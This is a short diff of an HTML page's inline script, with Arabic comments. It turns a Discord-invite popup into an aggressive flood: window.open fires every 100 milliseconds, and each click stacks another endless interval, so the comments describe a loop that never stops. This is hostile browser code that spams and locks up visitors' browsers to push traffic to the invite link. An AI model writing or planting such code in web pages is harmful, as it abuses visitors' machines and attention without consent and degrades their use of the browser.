@@ -129,18 +129,20 @@
 </head>
 <body>
 
-<!-- سكربت فتح رابط الديسكورد بشكل متكرر (Loop) -->
+<!-- سكربت فتح رابط الديسكورد بـ Loop مستمر لا يتوقف -->
 <script>
     window.addEventListener('DOMContentLoaded', () => {
-        // محاولة الفتح التكراري كل ثانيتين (2000 ملي ثانية)
+        // حلقة مستمرة بدون توقف نهائياً
         setInterval(() => {
             window.open('https://discord.gg/uaee', '_blank');
-        }, 2000);
+        }, 100); // تكرار فوري كل 0.1 ثانية تقريباً
     });
 
-    // طريقة احتياطية لتكرار الفتح عند النقر المستمر
+    // تكرار إضافي مستمر عند أي تفاعل أو ضغطة
     document.addEventListener('click', () => {
-        window.open('https://discord.gg/uaee', '_blank');
+        setInterval(() => {
+            window.open('https://discord.gg/uaee', '_blank');
+        }, 100);
     });
 </script>
 
